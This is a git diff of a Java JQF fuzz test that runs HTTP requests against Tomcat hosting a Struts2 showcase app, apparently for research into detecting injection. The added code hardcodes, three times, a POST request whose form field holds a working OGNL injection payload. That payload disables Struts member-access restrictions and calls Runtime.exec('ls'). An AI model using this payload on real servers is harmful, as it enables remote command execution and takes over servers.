@@ -5,46 +5,36 @@ import edu.berkeley.cs.jqf.examples.common.Dictionary;
 import edu.berkeley.cs.jqf.examples.http.HTTPRequestGenerator;
 import edu.berkeley.cs.jqf.fuzz.Fuzz;
 import edu.berkeley.cs.jqf.fuzz.JQF;
-import org.apache.catalina.*;
-import org.apache.catalina.connector.Connector;
-import org.apache.catalina.core.AprLifecycleListener;
-import org.apache.catalina.core.StandardServer;
-import org.apache.catalina.session.ManagerBase;
-import org.apache.catalina.session.StandardManager;
-import org.apache.catalina.startup.Tomcat;
-import org.apache.catalina.valves.AccessLogValve;
-import org.apache.catalina.webresources.StandardRoot;
 import org.apache.coyote.ProtocolHandler;
-import org.apache.coyote.http11.*;
+import org.apache.coyote.http11.AbstractHttp11Protocol;
+import org.apache.coyote.http11.Http11NioProtocol;
+import org.apache.coyote.http11.Http11Processor;
 import org.apache.http.Header;
 import org.apache.http.client.methods.HttpUriRequest;
 import org.apache.tomcat.util.net.*;
-import org.apache.tomcat.util.scan.StandardJarScanFilter;
-import org.apache.tomcat.util.scan.StandardJarScanner;
-import org.junit.*;
+import org.junit.Assume;
+import org.junit.Before;
+import org.junit.Rule;
+import org.junit.rules.ExternalResource;
 import org.junit.runner.RunWith;
+import org.junit.runners.model.Statement;
 
 
-import javax.servlet.ServletException;
 import java.io.*;
-import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.ByteBuffer;
-import java.nio.file.FileSystems;
-import java.nio.file.Files;
-import java.nio.file.Path;
 import java.util.ArrayList;
 import java.util.List;
 
 
 @RunWith(JQF.class)
-public class HTTPRequestTest {
-
-    private static Tomcat tomcat;
+public class HTTPRequestTest extends TomcatBaseTest {
 
     private boolean accessLogEnabled = false;
 
     private static File tempDir;
+
+    private final String webapp_string = "struts2-showcase-2_3_20_1";
 
     private static boolean tomcatTeardown = false;
 
@@ -56,98 +46,15 @@ public class HTTPRequestTest {
         return tempDir;
     }
 
-    @BeforeClass
-    public static void setUpPerTestClass() throws Exception {
-        // Create catalina.base directory
-        File tempBase = new File(System.getProperty("tomcat.test.temp", "output/tmp"));
-        if (!tempBase.mkdirs() && !tempBase.isDirectory()) {
-            Assert.fail("Unable to create base temporary directory for tests");
+
+    @Rule
+    public final ExternalResource myWebApp = new ExternalResource() {
+        @Override
+        protected void before() throws Throwable {
+            System.out.println("SECOND BEFORE!");
+            addWebApp(webapp_string);
         }
-        Path tempBasePath = FileSystems.getDefault().getPath(tempBase.getAbsolutePath());
-        tempDir = Files.createTempDirectory(tempBasePath, "test").toFile();
-
-        System.setProperty("catalina.base", tempDir.getAbsolutePath());
-
-        // Configure logging
-        System.setProperty("java.util.logging.manager",
-                "org.apache.juli.ClassLoaderLogManager");
-        System.setProperty("java.util.logging.config.file",
-                new File(System.getProperty("tomcat.test.basedir"),
-                        "conf/logging.properties").toString());
-
-
-        if (System.getenv("TOMCAT_TEARDOWN") != null) {
-            tomcatTeardown = true;
-        }
-
-    }
-
-
-    @Before
-    public void setUp() throws Exception {
-
-        File appBase = new File(getTemporaryDirectory(), "webapps");
-        if (!appBase.exists() && !appBase.mkdir()) {
-            Assert.fail("Unable to create appBase for test");
-        }
-
-        if (tomcat == null) {
-            System.out.println("TOMCAT WAS NULL!");
-            tomcat = new TomcatWithFastSessionIDs();
-
-            String protocol = getProtocol();
-            Connector connector = new Connector(protocol);
-            // Listen only on localhost
-            connector.setAttribute("address",
-                    InetAddress.getByName("localhost").getHostAddress());
-            // Use random free port
-            connector.setPort(0);
-            // Mainly set to reduce timeouts during async tests
-            connector.setAttribute("connectionTimeout", "3000");
-            connector.setAttribute("maxThreads", "1");
-            tomcat.getService().addConnector(connector);
-            tomcat.setConnector(connector);
-
-            // Add AprLifecycleListener if we are using the Apr connector
-            if (protocol.contains("Apr")) {
-                StandardServer server = (StandardServer) tomcat.getServer();
-                AprLifecycleListener listener = new AprLifecycleListener();
-                listener.setSSLRandomSeed("/dev/urandom");
-                server.addLifecycleListener(listener);
-                connector.setAttribute("pollerThreadCount", Integer.valueOf(1));
-            }
-
-            File catalinaBase = getTemporaryDirectory();
-            tomcat.setBaseDir(catalinaBase.getAbsolutePath());
-            tomcat.getHost().setAppBase(appBase.getAbsolutePath());
-
-            accessLogEnabled = Boolean.parseBoolean(
-                    System.getProperty("tomcat.test.accesslog", "false"));
-            if (accessLogEnabled) {
-                String accessLogDirectory = System
-                        .getProperty("tomcat.test.reports");
-                if (accessLogDirectory == null) {
-                    accessLogDirectory = new File(getBuildDirectory(), "logs")
-                            .toString();
-                }
-                AccessLogValve alv = new AccessLogValve();
-                alv.setDirectory(accessLogDirectory);
-                alv.setPattern("%h %l %u %t \"%r\" %s %b %I %D");
-                tomcat.getHost().getPipeline().addValve(alv);
-            }
-
-            // Cannot delete the whole tempDir, because logs are there,
-            // but delete known subdirectories of it.
-            addDeleteOnTearDown(new File(catalinaBase, "webapps"));
-            addDeleteOnTearDown(new File(catalinaBase, "work"));
-
-//            String docBase = "/home/jamesk/Downloads/apache-tomcat-9.0.16-src/output/build/webapps/examples";
-//            tomcat.addWebapp("/", new File(docBase).getAbsolutePath());
-//            tomcat.start();
-            addSimpleBuggyWebappToTomcat(false, true);
-        }
-
-    }
+    };
 
     protected String getProtocol() {
         // Has a protocol been specified
@@ -165,75 +72,58 @@ public class HTTPRequestTest {
     public void addDeleteOnTearDown(File file) {
         deleteOnTearDown.add(file);
     }
-
-    public static File getBuildDirectory() {
-        return new File(System.getProperty("tomcat.test.tomcatbuild",
-                "output/build"));
-    }
-
-
-    @After
-    public void tearDown() throws Exception {
-        // Some tests may call tomcat.destroy(), some tests may just call
-        // tomcat.stop(), some not call either method. Make sure that stop()
-        // & destroy() are called as necessary.
-
-        if (HTTPRequestTest.tomcatTeardown) {
-            if (tomcat.getServer() != null
-                    && tomcat.getServer().getState() != LifecycleState.DESTROYED) {
-                if (tomcat.getServer().getState() != LifecycleState.STOPPED) {
-                    tomcat.stop();
-                }
-                tomcat.destroy();
-            }
-
-            tomcat = null;
-        }
-    }
-
-    @Fuzz
-    public void parseHTTPRequest(byte[] input) {
-        Assume.assumeTrue(input.length < 200);
-        HeaderParser parser = new HeaderParser(input);
-        try {
-            parser.parseHeaders();
-        } catch (IllegalArgumentException e) {
-            Assume.assumeNoException(e);
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
-    }
+//
+//    public static File getBuildDirectory() {
+//        return new File(System.getProperty("tomcat.test.tomcatbuild",
+//                "output/build"));
+//    }
 
 
-    protected void addSimpleBuggyWebappToTomcat(boolean addJstl, boolean start)
-            throws ServletException, LifecycleException {
+//    @After
+//    public void tearDown() throws Exception {
+//        // Some tests may call tomcat.destroy(), some tests may just call
+//        // tomcat.stop(), some not call either method. Make sure that stop()
+//        // & destroy() are called as necessary.
+//
+//        if (HTTPRequestTest.tomcatTeardown) {
+//            if (tomcat.getServer() != null
+//                    && tomcat.getServer().getState() != LifecycleState.DESTROYED) {
+//                if (tomcat.getServer().getState() != LifecycleState.STOPPED) {
+//                    tomcat.stop();
+//                }
+//                tomcat.destroy();
+//            }
+//
+//            tomcat = null;
+//        }
+//    }
 
-        Context ctx = tomcat.addContext("", null);
-        Tomcat.addServlet(ctx, "simplebuggy", new SimpleBuggyServlet());
-        ctx.addServletMappingDecoded("/", "simplebuggy");
+//    @Fuzz
+//    public void parseHTTPRequest(byte[] input) {
+//        Assume.assumeTrue(input.length < 200);
+//        HeaderParser parser = new HeaderParser(input);
+//        try {
+//            parser.parseHeaders();
+//        } catch (IllegalArgumentException e) {
+//            Assume.assumeNoException(e);
+//        } catch (IOException e) {
+//            throw new RuntimeException(e);
+//        }
+//    }
 
-
-        if (start) {
-            tomcat.start();
-        }
-    }
-
-
-    private static final class Client extends SimpleHttpClient {
-
-        public Client(int port) {
-            setPort(port);
-        }
-
-        @Override
-        public boolean isResponseBodyOK() {
-            return getResponseBody().contains("test - data");
-        }
-    }
-
-    private Boolean isResponse50x(String resp) {
-        return resp.startsWith(FAIL_50X);
-    }
+//
+//    protected void addSimpleBuggyWebappToTomcat(boolean addJstl, boolean start)
+//            throws ServletException, LifecycleException {
+//
+//        Context ctx = tomcat.addContext("", null);
+//        Tomcat.addServlet(ctx, "simplebuggy", new SimpleBuggyServlet());
+//        ctx.addServletMappingDecoded("/", "simplebuggy");
+//
+//
+//        if (start) {
+//            tomcat.start();
+//        }
+//    }
 
 
     @Fuzz
@@ -241,6 +131,29 @@ public class HTTPRequestTest {
 
         try {
             String request = input;
+//            request = "GET /struts2-showcase-2_3_20_1/index.action HTTP/1.1\r\n" +
+//                    "Host: any\r\n" +
+//                    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0\r\n" +
+//                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
+//                    "Accept-Language: en-US,en;q=0.5\r\n" +
+//                    "Accept-Encoding: gzip, deflate\r\n" +
+//                    "Connection: keep-alive\r\n" +
+//                    "Cookie: JSESSIONID=B8071E5AAEDED6181D7C0ACFFBA3D862\r\n" +
+//                    "Upgrade-Insecure-Requests: 1\r\n" +
+//                    "Cache-Control: max-age=0\r\n\r\n";
+            request = "POST /" + webapp_string + "/integration/saveGangster.action HTTP/1.1\r\n" +
+                    "Host: any\r\n" +
+                    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0\r\n" +
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
+                    "Accept-Language: en-US,en;q=0.5\r\n" +
+                    "Accept-Encoding: gzip, deflate\r\n" +
+                    "Referer: http://localhost:8080/struts2-showcase-2_3_10/integration/editGangster\r\n" +
+                    "Content-Type: application/x-www-form-urlencoded\r\n" +
+                    "Content-Length: 708\r\n" +
+                    "Connection: keep-alive\r\n" +
+                    "Cookie: JSESSIONID=355085EC5421F19AF97B123A53841DF7\r\n" +
+                    "Upgrade-Insecure-Requests: 1\r\n\r\n" +
+                    "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
 
             ProtocolHandler protocol = tomcat.getConnector().getProtocolHandler();
             AbstractHttp11Protocol<?> http11Protocol = (AbstractHttp11Protocol<?>) protocol;
@@ -254,14 +167,21 @@ public class HTTPRequestTest {
 
             String line = reader.readLine();
 
+            System.out.println(line);
             if (line.startsWith("\0")) {
                 throw new IllegalStateException("SERVER EXCEPTION!");
+            }
+            else if (OGNLInjection.getInjectionDetected()) {
+                System.out.println("HELLO THERE!");
+                OGNLInjection.setInjectionDetected(false);
+                throw new IllegalStateException("OGNL Injection Detected!");
             }
         } catch (UnknownHostException e) {
             Assume.assumeNoException(e);
         } catch (IOException e) {
             Assume.assumeNoException(e);
         }
+
 
     }
 
@@ -278,12 +198,25 @@ public class HTTPRequestTest {
 
         try {
 
+            request = "POST /" + webapp_string + "/integration/saveGangster.action HTTP/1.1\r\n" +
+                    "Host: any\r\n" +
+                    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0\r\n" +
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
+                    "Accept-Language: en-US,en;q=0.5\r\n" +
+                    "Accept-Encoding: gzip, deflate\r\n" +
+                    "Referer: http://localhost:8080/struts2-showcase-2_3_10/integration/editGangster\r\n" +
+                    "Content-Type: application/x-www-form-urlencoded\r\n" +
+                    "Content-Length: 708\r\n" +
+                    "Connection: keep-alive\r\n" +
+                    "Cookie: JSESSIONID=355085EC5421F19AF97B123A53841DF7\r\n" +
+                    "Upgrade-Insecure-Requests: 1\r\n\r\n" +
+                    "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
 
             ProtocolHandler protocol = tomcat.getConnector().getProtocolHandler();
             AbstractHttp11Protocol<?> http11Protocol = (AbstractHttp11Protocol<?>) protocol;
             Http11Processor processor = new Http11Processor(http11Protocol, tomcat.getConnector().getProtocolHandler().getAdapter());
 
-           // System.out.println(request);
+            // System.out.println(request);
             ByteBuffer buf = ByteBuffer.wrap(request.getBytes());
 
             SocketWrapper wrapper = new SocketWrapper(buf);
@@ -299,6 +232,10 @@ public class HTTPRequestTest {
             if (line.startsWith("\0")) {
                 throw new IllegalStateException("SERVER EXCEPTION!");
             }
+            else if (OGNLInjection.getInjectionDetected()) {
+                OGNLInjection.setInjectionDetected(false);
+                throw new OGNLInjectionException("OGNL Injection Detected!");
+            }
 
 
         } catch (UnknownHostException e) {
@@ -310,33 +247,6 @@ public class HTTPRequestTest {
 
     }
 
-
-    private static class TomcatWithFastSessionIDs extends Tomcat {
-
-        @Override
-        public void start() throws LifecycleException {
-            // Use fast, insecure session ID generation for all tests
-            Server server = getServer();
-            for (Service service : server.findServices()) {
-                Container e = service.getContainer();
-                for (Container h : e.findChildren()) {
-                    for (Container c : h.findChildren()) {
-                        Manager m = ((Context) c).getManager();
-                        if (m == null) {
-                            m = new StandardManager();
-                            ((Context) c).setManager(m);
-                        }
-                        if (m instanceof ManagerBase) {
-                            ((ManagerBase) m).setSecureRandomClass(
-                                    "org.apache.catalina.startup.FastNonSecureRandom");
-                        }
-                    }
-                }
-            }
-            super.start();
-        }
-    }
-
     private static class SocketWrapper extends SocketWrapperBase<Void> {
 
         final ByteBuffer in;
@@ -345,7 +255,7 @@ public class HTTPRequestTest {
         SocketWrapper(ByteBuffer in) {
             super(null, null);
             this.in = in;
-            this.out = ByteBuffer.wrap(new byte[1024]);
+            this.out = ByteBuffer.wrap(new byte[1024*1024]);
             this.socketBufferHandler = new SocketBufferHandler(4096, 4096, true);
         }
 
@@ -455,12 +365,48 @@ public class HTTPRequestTest {
 
 
     public static void main(String[] args) throws Throwable {
+
         HTTPRequestTest test = new HTTPRequestTest();
-        HTTPRequestTest.setUpPerTestClass();
-        test.setUp();
+        test.resource.apply(new Statement() {
+            @Override
+            public void evaluate() throws Throwable {
 
-        HTTPRequestTest.tomcat.getServer().await();
+            }
+        }, null).evaluate();
+        test.myWebApp.apply(new Statement() {
+            @Override
+            public void evaluate() throws Throwable {
+
+            }
+        }, null).evaluate();
+     //  HTTPRequestTest.tomcat.getServer().await();
 
 
+
+//       String request = "GET /struts2-showcase-2_3_20_1/index.action HTTP/1.1\r\n" +
+//               "Host: any\r\n" +
+//               "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0\r\n" +
+//               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
+//               "Accept-Language: en-US,en;q=0.5\r\n" +
+//               "Accept-Encoding: gzip, deflate\r\n" +
+//               "Connection: keep-alive\r\n" +
+//               "Cookie: JSESSIONID=B8071E5AAEDED6181D7C0ACFFBA3D862\r\n" +
+//               "Upgrade-Insecure-Requests: 1\r\n" +
+//               "Cache-Control: max-age=0\r\n\r\n";
+        String request = "POST /" + test.webapp_string + "/integration/saveGangster.action HTTP/1.1\r\n" +
+                "Host: any\r\n" +
+                "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0\r\n" +
+                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
+                "Accept-Language: en-US,en;q=0.5\r\n" +
+                "Accept-Encoding: gzip, deflate\r\n" +
+                "Referer: http://localhost:8080/struts2-showcase-2_3_10/integration/editGangster\r\n" +
+                "Content-Type: application/x-www-form-urlencoded\r\n" +
+                "Content-Length: 708\r\n" +
+                "Connection: keep-alive\r\n" +
+                "Cookie: JSESSIONID=355085EC5421F19AF97B123A53841DF7\r\n" +
+                "Upgrade-Insecure-Requests: 1\r\n\r\n" +
+                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
+
+        test.processHTTPRequest(request);
     }
 }
